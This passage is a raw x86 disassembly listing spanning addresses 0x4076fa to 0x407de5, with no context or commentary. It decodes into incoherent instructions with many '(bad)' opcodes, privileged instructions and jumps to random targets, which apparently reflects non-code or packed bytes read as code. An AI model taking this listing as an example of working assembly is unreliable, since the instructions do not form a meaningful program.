  4076fa:	gs arpl WORD PTR fs:[edx+0x61],sp
  4076ff:	popa   
  407700:	add    BYTE PTR [edi],dl
  407702:	push   es
  407703:	add    dh,BYTE PTR [edx]
  407705:	and    al,0x1e
  407707:	jno    0x40770b
  407709:	sub    BYTE PTR [esp+edi*2],ah
  40770c:	jb     0x407789
  40770e:	sub    BYTE PTR [eax],dl
  407710:	or     eax,0x4b7b670e
  407715:	dec    ecx
  407716:	dec    eax
  407717:	jge    0x40778e
  407719:	(bad)  
  40771a:	(bad)  
  40771b:	(bad)  
  40771c:	(bad)  
  40771d:	jle    0x407782
  40771f:	pop    ecx
  407720:	add    BYTE PTR [edi+0x44],bl
  407723:	pop    esp
  407724:	pop    ss
  407725:	bound  ecx,QWORD PTR [bx+di+0x12]
  407729:	outs   dx,DWORD PTR ds:[esi]
  40772a:	jle    0x40777a
  40772c:	push   ebp
  40772d:	pop    edi
  40772e:	push   0x41
  407730:	sbb    esp,DWORD PTR [edi+0x40]
  407733:	inc    ebp
  407734:	cs dec edx
  407736:	dec    eax
  407737:	jnp    0x407792
  407739:	jne    0x407768
  40773b:	cs push esi
  40773d:	jecxz  0x40773e
  40773f:	(bad)  
  407740:	jmp    DWORD PTR [edi+ebx*2]
  407743:	jb     0x407797
  407745:	and    dh,BYTE PTR [ebp+0x5e]
  407748:	pop    eax
  407749:	pop    ecx
  40774a:	je     0x407788
  40774c:	cmp    DWORD PTR [ebx+0x42],edx
  40774f:	inc    esi
  407750:	jbe    0x4077a8
  407752:	cmp    eax,0x3141366d
  407757:	push   esi
  407758:	push   ebp
  407759:	push   esp
  40775a:	pop    ebx
  40775b:	or     BYTE PTR [ebx+0x7ffff5bf],ch
  407761:	addr16 xor al,0x6d
  407764:	outs   dx,DWORD PTR ds:[esi]
  407765:	arpl   WORD PTR [ebx],si
  407767:	imul   eax,DWORD PTR [ecx],0x1317643a
  40776d:	bound  ecx,QWORD PTR [ebx]
  40776f:	push   0xa1141918
  407774:	pop    ds
  407775:	cmp    al,0xe
  407777:	es es (bad) 
  40777a:	(bad)  
  40777b:	(bad)  
  40777c:	dec    DWORD PTR [eax]
  40777e:	adc    eax,DWORD PTR [ebx]
  407780:	adc    BYTE PTR [edx],dl
  407782:	je     0x4077b8
  407784:	je     0x4077f3
  407786:	dec    ebp
  407787:	push   ecx
  407788:	add    ebx,DWORD PTR [eax+0xc]
  40778b:	dec    ebp
  40778c:	subps  xmm0,XMMWORD PTR [eax]
  40778f:	pop    ds
  407790:	or     ebx,DWORD PTR [eax+0x1]
  407793:	jbe    0x4077b4
  407795:	push   0x18
  407797:	pop    es
  407798:	adc    eax,DWORD PTR [eax+0x6e]
  40779b:	jge    0x4077bc
  40779d:	(bad)  
  40779e:	(bad)  
  40779f:	call   DWORD PTR [esi]
  4077a1:	add    eax,0x66481b53
  4077a6:	jbe    0x4077cf
  4077a8:	jl     0x4077fb
  4077aa:	and    esi,DWORD PTR fs:[eax+0x2c]
  4077ae:	xor    esp,DWORD PTR [edi]
  4077b0:	push   edx
  4077b1:	and    BYTE PTR [ebx+0x2b],ah
  4077b4:	js     0x40780c
  4077b6:	cmp    ebp,DWORD PTR es:[ecx-0x6]
  4077ba:	jg     0x4077b3
  4077bc:	(bad)  
  4077bd:	cmp    BYTE PTR [ebp+0x6f],bh
  4077c0:	xor    ebp,DWORD PTR [ebx+0x4f]
  4077c3:	outs   dx,BYTE PTR ds:[esi]
  4077c4:	push   edx
  4077c5:	xor    BYTE PTR [edx+0x33],dh
  4077c8:	xor    ah,BYTE PTR [ebp+0x56]
  4077cb:	and    DWORD PTR [edi],esi
  4077cd:	push   ebx
  4077ce:	push   eax
  4077cf:	ins    BYTE PTR es:[edi],dx
  4077d0:	or     BYTE PTR [ebx],cl
  4077d2:	add    eax,0xf10c1019
  4077d7:	pop    ss
  4077d8:	clc    
  4077d9:	fild   QWORD PTR [ebx+eiz*1+0x12]
  4077dd:	ins    BYTE PTR es:[edi],dx
  4077de:	pusha  
  4077df:	jns    0x4077ff
  4077e1:	cmp    bh,BYTE PTR [ebx]
  4077e3:	jge    0x4077f0
  4077e5:	cmp    DWORD PTR [ecx+0x71],esp
  4077e8:	sub    eax,0x8b7f0302
  4077ed:	jmp    FWORD PTR [edi]
  4077ef:	call   0x2f4b8e0b
  4077f4:	jle    0x40786a
  4077f6:	push   0x7f
  4077f8:	dec    esp
  4077f9:	jo     0x407868
  4077fb:	dec    esi
  4077fc:	inc    esi
  4077fd:	or     eax,0x41037652
  407802:	push   esi
  407803:	(bad)  
  407804:	(bad)  
  407805:	inc    DWORD PTR [ebp+0x4267426b]
  40780b:	jae    0x407868
  40780d:	sbb    BYTE PTR [esi+0x16],al
  407810:	push   edi
  407811:	push   0x56
  407813:	jnp    0x407865
  407815:	push   esp
  407816:	jle    0x407846
  407818:	fs jge 0x407843
  40781b:	imul   edx,DWORD PTR [ecx+ecx*2+0x55],0x22
  407820:	jbe    0x407821
  407822:	(bad)  
  407824:	inc    DWORD PTR [ebp+0x20]
  407827:	jg     0x40786f
  407829:	push   ebp
  40782a:	dec    ebp
  40782b:	dec    ecx
  40782c:	cmp    al,0x61
  40782e:	cmp    BYTE PTR [edx+0x5f],al
  407831:	pop    edi
  407832:	inc    ecx
  407833:	ins    BYTE PTR es:[edi],dx
  407834:	or     al,0x32
  407836:	ja     0x40788e
  407838:	pop    esi
  407839:	push   esi
  40783a:	or     DWORD PTR [esi],eax
  40783c:	or     ecx,DWORD PTR [eax+edx*2]
  40783f:	sub    edx,DWORD PTR [eax]
  407841:	das    
  407842:	outs   dx,DWORD PTR ds:[esi]
  407843:	(bad)  
  407844:	jmp    FWORD PTR [eax]
  407846:	add    eax,0x2f0e1415
  40784b:	cmp    al,BYTE PTR [edx+edi*2]
  40784e:	sbb    al,0x6
  407850:	sbb    dl,BYTE PTR [eax]
  407852:	add    al,0x1e
  407854:	or     bl,cl
  407856:	sbb    bh,BYTE PTR [eax+eiz*1]
  407859:	or     ebp,DWORD PTR [ecx]
  40785b:	push   ss
  40785c:	(bad)  
  40785d:	fstp   st(3)
  40785f:	xchg   edi,eax
  407860:	add    BYTE PTR [edi],ah
  407862:	jno    0x4078d8
  407864:	or     esp,DWORD PTR [edi+0x5c]
  407867:	dec    ebx
  407868:	push   esi
  407869:	push   ecx
  40786a:	addr16 pop edx
  40786c:	bound  eax,QWORD PTR [edi+edx*2]
  40786f:	pop    esp
  407870:	sbb    DWORD PTR [ebx],ebx
  407872:	fs (bad) 
  407874:	fstp   TBYTE PTR [edi-0x5]
  407877:	jp     0x4078bd
  407879:	inc    eax
  40787a:	inc    esi
  40787b:	inc    esi
  40787c:	scas   al,BYTE PTR es:[edi]
  40787d:	arpl   WORD PTR [eax+0x72],si
  407880:	adc    al,0x49
  407882:	sub    DWORD PTR [ecx],esi
  407884:	sub    esp,DWORD PTR [edx+0x2f]
  407887:	inc    ebx
  407888:	jbe    0x407900
  40788a:	pop    ebx
  40788b:	jbe    0x4078e5
  40788d:	jp     0x4078d1
  40788f:	(bad)  
  407890:	mov    edi,0x7624ffd0
  407895:	jl     0x407901
  407897:	cmp    eax,DWORD PTR [ecx+ebx*2+0x32]
  40789b:	cmp    DWORD PTR [eax],edi
  40789d:	and    edi,DWORD PTR [ebx+edx*2+0x7a]
  4078a1:	inc    ecx
  4078a2:	xor    esi,DWORD PTR [ecx]
  4078a4:	sbb    al,0x27
  4078a6:	and    BYTE PTR [eax],bh
  4078a8:	sub    ch,BYTE PTR ds:0xffffe93c
  4078ae:	call   DWORD PTR ds:0x716e3665
  4078b4:	ins    BYTE PTR es:[edi],dx
  4078b5:	imul   edi,DWORD PTR [eax+0x1a],0x0
  4078b9:	pushw  0x3c
  4078bc:	xor    dh,BYTE PTR ds:0x7c7d1f7b
  4078c2:	or     al,0x7a
  4078c4:	jns    0x407940
  4078c6:	add    eax,0xe60d130e
  4078cb:	(bad)  
  4078cc:	fcomip st,st(0)
  4078ce:	jg     0x407944
  4078d0:	jno    0x40792a
  4078d2:	push   cs
  4078d3:	jnp    0x4078e8
  4078d5:	jbe    0x40793a
  4078d7:	push   ss
  4078d8:	or     dl,BYTE PTR [edi+0x906717d]
  4078de:	jle    0x407946
  4078e0:	js     0x407901
  4078e2:	sbb    eax,0x1a506919
  4078e7:	sti    
  4078e8:	(bad)  
  4078e9:	(bad)  
  4078eb:	data16 adc al,0x50
  4078ee:	jae    0x407950
  4078f0:	adc    eax,DWORD PTR [edx+edx*2+0x27]
  4078f4:	cs loop 0x407958
  4078f7:	pusha  
  4078f8:	sub    DWORD PTR [ebx],esi
  4078fa:	jnp    0x407958
  4078fc:	js     0x407951
  4078fe:	push   ebp
  4078ff:	js     0x40794c
  407901:	jge    0x40793c
  407903:	dec    ebp
  407904:	cdq    
  407905:	(bad)  
  407906:	call   DWORD PTR [edi]
  407908:	jle    0x40793d
  40790a:	cmp    DWORD PTR [ecx],edi
  40790c:	pop    eax
  40790d:	xor    al,0x93
  40790f:	bound  esi,QWORD PTR [ecx+0x77]
  407912:	js     0x40794a
  407914:	push   eax
  407915:	or     dl,BYTE PTR [edx]
  407917:	and    al,0x57
  407919:	sub    BYTE PTR [esi+eax*1],cl
  40791c:	xor    dh,BYTE PTR [edx]
  40791e:	cmp    dl,BYTE PTR [eax+eiz*2]
  407921:	(bad)  
  407922:	dec    DWORD PTR [ebx]
  407924:	std    
  407925:	or     BYTE PTR [esi+eax*1],al
  407928:	pusha  
  407929:	cmp    esi,DWORD PTR [eax]
  40792b:	rcr    BYTE PTR [eax],cl
  40792d:	sbb    al,0x24
  40792f:	cmp    al,0x22
  407931:	sub    al,BYTE PTR [edx+ecx*1]
  407934:	sbb    BYTE PTR [esi+edx*1],dl
  407937:	jo     0x40796d
  407939:	invd   
  40793b:	ja     0x407945
  40793d:	(bad)  
  40793e:	mov    edi,0x486cffd0
  407943:	pop    eax
  407944:	push   edx
  407945:	pop    edx
  407946:	je     0x4079c7
  407948:	imul   ebx,DWORD PTR [esi+0x66],0x7b
  40794c:	add    eax,0x7b78077c
  407951:	sbb    esi,DWORD PTR [ebp+0x42]
  407954:	dec    edx
  407955:	fs pusha 
  407957:	js     0x4079bd
  407959:	mov    edi,0x76fffff0
  40795e:	adc    BYTE PTR [ebp+0x4e],dl
  407961:	adc    DWORD PTR [edi],edx
  407963:	push   0x72535a4d
  407968:	jp     0x4079c1
  40796a:	push   0x20464457
  40796f:	jle    0x4079cf
  407971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407972:	pop    eax
  407973:	pop    ebp
  407974:	pop    esi
  407975:	jl     0x4079d9
  407977:	mov    edi,0x6ae17ff1
  40797c:	inc    edi
  40797d:	jge    0x407938
  40797f:	push   esi
  407980:	xor    BYTE PTR [edi+0x35],ch
  407983:	sub    eax,0x6372e37
  407988:	or     al,0x6a
  40798a:	sub    eax,0xc241528
  40798f:	(bad)  
  407990:	(bad)  
  407991:	jg     0x407974
  407993:	outs   dx,BYTE PTR ds:[esi]
  407994:	xor    DWORD PTR [edx],ebp
  407996:	dec    esp
  407997:	push   ds
  407998:	pop    es
  407999:	cmp    bh,BYTE PTR [eax]
  40799b:	cmp    al,0x30
  40799d:	sbb    eax,0x1c341e35
  4079a2:	jle    0x4079ca
  4079a4:	sub    bh,BYTE PTR [eax]
  4079a6:	jno    0x4079b6
  4079a8:	pop    ss
  4079a9:	and    DWORD PTR ds:[eax+eiz*1],ebp
  4079ad:	push   esi
  4079af:	(bad)  
  4079b1:	push   cs
  4079b2:	pcmpeqb mm0,QWORD PTR [esp+ebp*2+0xe]
  4079b7:	push   edi
  4079b8:	je     0x407a34
  4079ba:	add    ebp,eax
  4079bc:	or     eax,0x7e505c54
  4079c1:	sbb    al,0x7e
  4079c3:	jl     0x4079e3
  4079c5:	inc    esp
  4079c6:	pop    ds
  4079c7:	outs   dx,BYTE PTR ds:[esi]
  4079c8:	adc    DWORD PTR [ebp+0x6efb7fff],ecx
  4079ce:	jbe    0x407a38
  4079d0:	push   edx
  4079d1:	dec    esp
  4079d2:	dec    esp
  4079d3:	sub    DWORD PTR [esi],ebp
  4079d5:	and    eax,0x6b742e6e
  4079da:	sub    dl,BYTE PTR [ebp+0x5e]
  4079dd:	inc    ebx
  4079de:	dec    esp
  4079df:	push   esp
  4079e0:	cmp    eax,0xf9726363
  4079e5:	(bad)  
  4079e6:	call   DWORD PTR [edi+0x5e]
  4079e9:	dec    ecx
  4079ea:	dec    edi
  4079eb:	inc    edx
  4079ec:	pop    ebx
  4079ed:	dec    esp
  4079ee:	inc    eax
  4079ef:	pop    edi
  4079f0:	je     0x407a3c
  4079f2:	jbe    0x407a3d
  4079f4:	inc    edi
  4079f5:	sbb    al,0x29
  4079f7:	adc    DWORD PTR [ebx+0x0],ebx
  4079fa:	push   esp
  4079fb:	adc    ch,BYTE PTR [eax+0x26]
  4079fe:	dec    DWORD PTR [ebp+0x1effff]
  407a04:	add    ebp,DWORD PTR [edi+0x2c]
  407a07:	bound  esi,QWORD PTR [edx]
  407a09:	push   0x21
  407a0b:	cmp    eax,0x7c753c77
  407a10:	add    al,0x20
  407a12:	sbb    eax,0xe296d77
  407a17:	cs adc eax,0x5f02a07
  407a1d:	inc    BYTE PTR [esi+0x5e]
  407a20:	or     edi,DWORD PTR [edi+0x42]
  407a23:	adc    DWORD PTR [ecx],eax
  407a25:	or     esp,DWORD PTR [edx]
  407a27:	add    eax,0xff7c577d
  407a2c:	pop    edi
  407a2d:	(bad)  
  407a2e:	lods   eax,DWORD PTR ds:[esi]
  407a2f:	icebp  
  407a30:	(bad)  
  407a31:	bound  esp,QWORD PTR [edi+0x1d]
  407a34:	dec    edi
  407a35:	sbb    DWORD PTR [ecx+0x70],edi
  407a38:	jne    0x407aae
  407a3a:	adc    eax,DWORD PTR [esi+0x10]
  407a3d:	pop    ecx
  407a3e:	xor    DWORD PTR [edi+0x4d],edx
  407a41:	ja     0x407aa3
  407a43:	pop    esi
  407a44:	rcr    DWORD PTR [eax-0x8],1
  407a47:	push   DWORD PTR [edi]
  407a49:	gs pop eax
  407a4b:	pop    esi
  407a4c:	pop    edx
  407a4d:	popa   
  407a4e:	fs inc ebx
  407a50:	dec    ecx
  407a51:	and    al,0x42
  407a53:	pop    ecx
  407a54:	popa   
  407a55:	idiv   DWORD PTR [edi]
  407a57:	iret   
  407a58:	jmp    DWORD PTR [ebp+0x5627bfff]
  407a5e:	xor    eax,DWORD PTR ss:[edx+ebp*1+0x29]
  407a63:	sub    al,0x54
  407a65:	sub    DWORD PTR [edx],edx
  407a67:	or     dl,BYTE PTR [eax]
  407a69:	push   ss
  407a6a:	adc    BYTE PTR [ebx+0x10],dh
  407a6d:	cmp    BYTE PTR [esi+eiz*1],bl
  407a70:	sbb    eax,0xe21f3231
  407a75:	dec    DWORD PTR [ebp+0x2c1cc96f]
  407a7b:	sbb    edi,DWORD PTR [edx+0x63]
  407a7e:	add    edi,DWORD PTR [edi+0x3e]
  407a81:	or     al,0xd
  407a83:	jb     0x407aa1
  407a85:	ja     0x407a96
  407a87:	ja     0x407ab3
  407a89:	jmp    FWORD PTR [edi+0x1b]
  407a8c:	fild   QWORD PTR [ecx+0x7d544a4c]
  407a92:	ret    0xcd71
  407a95:	dec    esi
  407a96:	add    bh,BYTE PTR [edi+0x7d]
  407a99:	add    DWORD PTR [edx+0x69],ecx
  407a9c:	dec    edi
  407a9d:	push   0xfe977912
  407aa2:	(bad)  
  407aa3:	in     eax,dx
  407aa4:	sbb    al,0x4a
  407aa6:	outs   dx,DWORD PTR ds:[esi]
  407aa7:	mov    edi,0x50737915
  407aac:	inc    edx
  407aad:	jb     0x407b03
  407aaf:	inc    esp
  407ab0:	push   ebx
  407ab1:	push   0x70
  407ab3:	dec    esi
  407ab4:	push   edi
  407ab5:	daa    
  407ab6:	xor    BYTE PTR es:[edi+0x22],bl
  407aba:	clc    
  407abb:	test   esi,esi
  407abd:	jmp    DWORD PTR [ecx]
  407abf:	and    DWORD PTR [ebx+edi*1+0x5a],ebp
  407ac3:	cmp    al,0x3b
  407ac5:	xor    ebp,DWORD PTR [edx+0x7c]
  407ac8:	pop    edi
  407ac9:	dec    esp
  407aca:	enter  0x6259,0x30
  407ace:	xor    dh,BYTE PTR cs:[edi]
  407ad1:	mov    edi,0xddd8dffd
  407ad6:	sub    eax,0x1a6c695c
  407adb:	push   ds
  407adc:	adc    al,0x6f
  407ade:	add    eax,DWORD PTR [ebx]
  407ae0:	xor    DWORD PTR [ebp-0x35],esp
  407ae3:	xor    al,0x2a
  407ae5:	pusha  
  407ae6:	add    BYTE PTR [edi],bh
  407ae8:	std    
  407ae9:	pop    edi
  407aea:	clc    
  407aeb:	push   DWORD PTR [eax+eiz*2]
  407aee:	xor    esi,DWORD PTR [eax+0x29]
  407af1:	or     DWORD PTR [ecx],edx
  407af3:	adc    al,0x74
  407af5:	cmp    DWORD PTR [edi+0x26],esi
  407af8:	cmp    ecx,edx
  407afa:	push   ss
  407afb:	push   0x5a
  407afd:	dec    edi
  407afe:	pop    eax
  407aff:	inc    edx
  407b00:	arpl   WORD PTR [esi],cx
  407b02:	fs popa 
  407b04:	jg     0x407aa7
  407b06:	(bad)  
  407b07:	mov    edi,0x5b776b68
  407b0c:	push   edi
  407b0d:	pop    eax
  407b0e:	pop    ds
  407b0f:	push   0x6c4a4545
  407b14:	bound  esi,QWORD PTR [edi+0x51]
  407b17:	and    BYTE PTR [eax],dl
  407b19:	dec    ecx
  407b1a:	jo     0x407b98
  407b1c:	inc    ebp
  407b1d:	ja     0x407ade
  407b1f:	icebp  
  407b20:	sar    bh,cl
  407b22:	sub    BYTE PTR [ecx+ebp*2+0x2d],bh
  407b26:	push   eax
  407b27:	inc    ebx
  407b28:	and    ch,BYTE PTR ds:0x2483224b
  407b2e:	inc    ebx
  407b2f:	dec    edx
  407b30:	int    0x67
  407b32:	ins    DWORD PTR es:[edi],dx
  407b33:	jnp    0x407b86
  407b35:	ins    DWORD PTR es:[edi],dx
  407b36:	outs   dx,DWORD PTR ds:[esi]
  407b37:	cld    
  407b38:	push   DWORD PTR [edi+0x5149df5d]
  407b3e:	adc    BYTE PTR ds:0x51332d3e,dl
  407b44:	cmp    BYTE PTR [ebx],ch
  407b46:	xor    bh,BYTE PTR [edi]
  407b48:	or     eax,0xc214371d
  407b4d:	and    eax,0xffff7f11
  407b52:	(bad)  
  407b53:	(bad)  
  407b54:	cmp    ah,BYTE PTR [ecx+0x25]
  407b57:	push   ds
  407b58:	cmp    DWORD PTR [edi],edx
  407b5a:	sub    DWORD PTR [edi],ecx
  407b5c:	cmp    DWORD PTR ds:0x921192a,ebx
  407b62:	aaa    
  407b63:	adc    ebp,DWORD PTR [eax+0x25]
  407b66:	sbb    DWORD PTR [eax],edi
  407b68:	imul   edx,DWORD PTR [ecx+0x5],0x68407f0a
  407b6f:	pop    ebp
  407b70:	pop    eax
  407b71:	outs   dx,BYTE PTR ds:[esi]
  407b72:	push   ecx
  407b73:	jl     0x407b66
  407b75:	mov    bh,0xdf
  407b77:	outs   dx,BYTE PTR ds:[esi]
  407b78:	addr16 jbe 0x407bf6
  407b7b:	inc    edi
  407b7c:	inc    ebp
  407b7d:	dec    ebx
  407b7e:	inc    eax
  407b7f:	jo     0x407c00
  407b81:	add    DWORD PTR [edx+0x61],eax
  407b84:	jle    0x407bdf
  407b86:	adc    al,0xa
  407b88:	mov    edi,0xe1bff4b1
  407b8d:	inc    esp
  407b8e:	jle    0x407bff
  407b90:	bound  ebp,QWORD PTR [ebp+0x52]
  407b93:	and    DWORD PTR [edi+0x5e],esp
  407b96:	inc    edi
  407b97:	inc    edi
  407b98:	call   0x3b4f:0x6e474e58
  407b9f:	fdivrp st(0),st
  407ba1:	jmp    FWORD PTR [ebp+0x7f]
  407ba4:	ins    DWORD PTR es:[edi],dx
  407ba5:	pop    ecx
  407ba6:	imul   esp,DWORD PTR [edi+0x68],0x453a6070
  407bad:	pop    esi
  407bae:	cld    
  407baf:	dec    ebp
  407bb0:	add    eax,0x2a080923
  407bb5:	sub    bh,bh
  407bb7:	call   FWORD PTR [ebx]
  407bb9:	call   FWORD PTR [esi]
  407bbb:	or     DWORD PTR [edx+0x6],esp
  407bbe:	xor    DWORD PTR [eax+0x1],esp
  407bc1:	cmp    ebx,DWORD PTR [edi+0x3740537]
  407bc7:	sub    al,0x25
  407bc9:	and    BYTE PTR [edi],bl
  407bcb:	sub    DWORD PTR cs:[edx],ecx
  407bce:	and    eax,0x36226977
  407bd3:	jns    0x407c04
  407bd5:	std    
  407bd6:	(bad)  
  407bd7:	push   DWORD PTR [edi+0x7e]
  407bda:	jb     0x407c52
  407bdc:	or     al,BYTE PTR [ecx]
  407bde:	push   ebp
  407bdf:	jge    0x407c34
  407be1:	data16 jp 0x407be6
  407be4:	jge    0x407bed
  407be6:	jno    0x407c07
  407be8:	push   ds
  407be9:	push   ebp
  407bea:	jp     0x407c47
  407bec:	ins    DWORD PTR es:[edi],dx
  407bed:	sbb    eax,0x41434875
  407bf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bf4:	jmp    FWORD PTR [edi+0x3]
  407bf7:	jns    0x407c63
  407bf9:	jno    0x407c22
  407bfb:	push   ebx
  407bfc:	push   esp
  407bfd:	pop    eax
  407bfe:	sub    eax,0x7070575e
  407c03:	inc    ebx
  407c04:	jns    0x407c15
  407c06:	das    
  407c07:	sub    al,0xfd
  407c09:	jmp    FWORD PTR [ecx+0x56]
  407c0c:	bound  ebp,QWORD PTR [ebx+0x7b]
  407c0f:	outs   dx,BYTE PTR ds:[esi]
  407c10:	inc    ecx
  407c11:	aas    
  407c12:	push   eax
  407c13:	jb     0x407c65
  407c15:	cmp    eax,0xeb7374b
  407c1a:	xchg   esp,eax
  407c1b:	dec    esp
  407c1c:	push   ebx
  407c1d:	sub    edi,edi
  407c1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c20:	(bad)  
  407c22:	and    eax,DWORD PTR [esi]
  407c24:	xor    ebp,DWORD PTR [ecx]
  407c26:	push   es
  407c27:	pop    ebx
  407c28:	cmp    BYTE PTR [eax],ah
  407c2a:	add    dl,BYTE PTR [eax]
  407c2c:	ss pop edi
  407c2e:	sub    ebp,DWORD PTR [ecx+0x15]
  407c31:	cmp    edx,DWORD PTR [esi]
  407c33:	add    DWORD PTR [ebx+ebx*1+0xb],esi
  407c37:	mov    edi,0x1333ffc1
  407c3c:	push   cs
  407c3d:	aas    
  407c3e:	xor    al,BYTE PTR [ecx]
  407c40:	sub    esi,DWORD PTR [eax+esi*1]
  407c43:	add    eax,0x5d7b7162
  407c48:	dec    edi
  407c49:	dec    edi
  407c4a:	jg     0x407cb0
  407c4c:	(bad)  
  407c4d:	fistp  WORD PTR [eax-0x8]
  407c50:	push   ecx
  407c51:	jnp    0x407cd0
  407c53:	bound  edi,QWORD PTR [ebp+0x2b]
  407c56:	pop    esp
  407c57:	cmp    eax,0x269616b
  407c5c:	pop    ds
  407c5d:	data16 jo 0x407ccc
  407c60:	push   ebx
  407c61:	jne    0x407cbb
  407c63:	inc    esp
  407c64:	jo     0x407c07
  407c66:	pop    edi
  407c67:	cli    
  407c68:	adc    bh,BYTE PTR [edx+0x47]
  407c6b:	jl     0x407cb3
  407c6d:	xor    dh,BYTE PTR [ecx+0x41]
  407c70:	and    DWORD PTR [edi+0x6d],ebx
  407c73:	cmp    eax,0xff4b2777
  407c78:	pop    ss
  407c79:	or     BYTE PTR cs:[ebx+0x74],al
  407c7d:	xor    ecx,DWORD PTR [eax+0x4e]
  407c80:	dec    ebx
  407c81:	dec    esi
  407c82:	xor    BYTE PTR [esi+0x36],ch
  407c85:	inc    edi
  407c86:	outs   dx,DWORD PTR ds:[si]
  407c88:	push   ss
  407c89:	pop    esp
  407c8a:	(bad)  
  407c8b:	(bad)  
  407c8c:	(bad)  
  407c8d:	call   FWORD PTR [ebx]
  407c8f:	push   ebx
  407c90:	xor    eax,0x2f163710
  407c95:	cmp    DWORD PTR [eax+0x16],esi
  407c98:	sub    DWORD PTR [ecx],ebx
  407c9a:	push   ss
  407c9b:	sbb    BYTE PTR [eax],bh
  407c9d:	xor    BYTE PTR [eax],dh
  407c9f:	and    al,0x66
  407ca1:	adc    eax,0x7b7d272a
  407ca6:	xor    bl,BYTE PTR [ebx+edi*1]
  407ca9:	daa    
  407caa:	adc    ah,BYTE PTR [edi]
  407cac:	sbb    al,0xb
  407cae:	das    
  407caf:	mov    ebp,0x332ffd5
  407cb4:	add    dh,BYTE PTR [ebx+0xf]
  407cb7:	js     0x407cc2
  407cb9:	jnp    0x407d23
  407cbb:	pop    esp
  407cbc:	fs jl  0x407d24
  407cbf:	dec    edi
  407cc0:	repnz inc edx
  407cc2:	inc    edi
  407cc3:	add    bh,bh
  407cc5:	call   DWORD PTR [edi]
  407cc7:	(bad)  
  407cc8:	sbb    eax,0x5e5e4246
  407ccd:	gs push ds
  407ccf:	das    
  407cd0:	inc    ecx
  407cd1:	jg     0x407d42
  407cd3:	jno    0x407ceb
  407cd5:	dec    ebx
  407cd6:	push   esp
  407cd7:	jl     0x407d40
  407cd9:	push   ebx
  407cda:	sub    BYTE PTR gs:[ebx+0x53],al
  407cde:	xor    esp,DWORD PTR [edx]
  407ce0:	pop    edx
  407ce1:	pop    eax
  407ce2:	idiv   bh
  407ce4:	outs   dx,DWORD PTR ds:[esi]
  407ce5:	cld    
  407ce6:	pop    ebx
  407ce7:	pop    ebx
  407ce8:	arpl   WORD PTR [ebx+0x29],ax
  407ceb:	pop    ebp
  407cec:	test   BYTE PTR [eax+0x5b],ch
  407cef:	fs aas 
  407cf1:	pop    esp
  407cf2:	gs push edx
  407cf4:	push   0x6d
  407cf6:	sub    BYTE PTR [eax+0x2e],bl
  407cf9:	push   ecx
  407cfa:	adc    edx,DWORD PTR [edi]
  407cfc:	(bad)  
  407cfd:	(bad)  
  407cfe:	jg     0x407cfb
  407d00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d01:	xor    ebx,DWORD PTR ds:0x6f1b7232
  407d07:	add    DWORD PTR [ecx],esp
  407d09:	adc    BYTE PTR ds:0x186b1f61,ah
  407d0f:	popa   
  407d10:	and    BYTE PTR ds:[eax+0x17],bh
  407d14:	sbb    esp,DWORD PTR [esi]
  407d16:	clc    
  407d17:	(bad)  
  407d18:	dec    DWORD PTR [ebx-0x66]
  407d1b:	and    al,0x73
  407d1d:	jae    0x407d91
  407d1f:	sub    dl,BYTE PTR ds:0x51190472
  407d25:	jo     0x407d80
  407d27:	push   edx
  407d28:	inc    edx
  407d29:	pop    esp
  407d2a:	push   edx
  407d2b:	pop    ebx
  407d2c:	vmwrite eax,DWORD PTR ds:0xfeb7595f
  407d33:	jbe    0x407d90
  407d35:	nop
  407d36:	jp     0x407d96
  407d38:	inc    ebp
  407d39:	push   ds
  407d3a:	data16 jnp 0x407da2
  407d3d:	dec    esi
  407d3e:	dec    esi
  407d3f:	pusha  
  407d40:	dec    esp
  407d41:	inc    ecx
  407d42:	sbb    BYTE PTR [eax],dl
  407d44:	das    
  407d45:	icebp  
  407d46:	mov    edi,0x7d447bc0
  407d4b:	push   0x6c
  407d4d:	sub    bl,BYTE PTR [ebx+0x7f]
  407d50:	and    al,0x2c
  407d52:	push   ebx
  407d53:	and    al,0x76
  407d55:	jge    0x407dc5
  407d57:	dec    ebx
  407d58:	std    
  407d59:	ffreep st(0)
  407d5b:	jmp    DWORD PTR [ebx+0x38]
  407d5e:	dec    esp
  407d5f:	cmp    ecx,DWORD PTR [edi+0x47]
  407d62:	jbe    0x407d99
  407d64:	xor    cl,BYTE PTR [eax+0x26]
  407d67:	and    al,0x3f
  407d69:	push   ds
  407d6a:	adc    dh,BYTE PTR [esi]
  407d6c:	and    ch,BYTE PTR [edi]
  407d6e:	xor    al,0x32
  407d70:	ins    BYTE PTR es:[edi],dx
  407d71:	adc    edi,edi
  407d73:	inc    esi
  407d75:	sbb    edx,DWORD PTR [esi]
  407d77:	push   ds
  407d78:	ins    DWORD PTR es:[edi],dx
  407d79:	and    al,0x58
  407d7b:	pusha  
  407d7c:	addr16 pusha 
  407d7e:	xor    al,0x3f
  407d80:	sbb    eax,0xf20347c
  407d85:	cmp    eax,0x75062722
  407d8a:	(bad)  
  407d8b:	inc    DWORD PTR [ebp+0x351535ff]
  407d91:	or     BYTE PTR [eax],ah
  407d93:	sub    eax,DWORD PTR [edi]
  407d95:	dec    eax
  407d96:	push   eax
  407d97:	pop    ds
  407d98:	je     0x407df6
  407d9a:	inc    eax
  407d9b:	add    DWORD PTR [ebx+0x6c],ebx
  407d9e:	jb     0x407de9
  407da0:	push   0x4b5b6276
  407da5:	dec    esp
  407da6:	push   0x97f4aadf
  407dab:	fstp   TBYTE PTR [edi+0x10]
  407dae:	adc    edi,DWORD PTR [esi+0x7d]
  407db1:	pop    ebp
  407db2:	jle    0x407da8
  407db4:	jl     0x407e0e
  407db6:	js     0x407e29
  407db8:	ret    0x97c2
  407dbb:	(bad)  
  407dbc:	and    dh,BYTE PTR [eax+0x4c]
  407dbf:	dec    esp
  407dc0:	das    
  407dc1:	pop    edi
  407dc2:	and    eax,0x685e232d
  407dc7:	inc    eax
  407dc8:	sub    eax,0x70bffe56
  407dcd:	sti    
  407dce:	inc    DWORD PTR [edi+0x63]
  407dd1:	inc    ebp
  407dd2:	xor    eax,0x4b625d4b
  407dd7:	dec    edx
  407dd8:	adc    al,0x21
  407dda:	and    eax,0x7c0350e7
  407ddf:	jb     0x407e12
  407de1:	movhps QWORD PTR [eax],xmm5
  407de4:	cld    
  407de5:	jg     0x407d6a
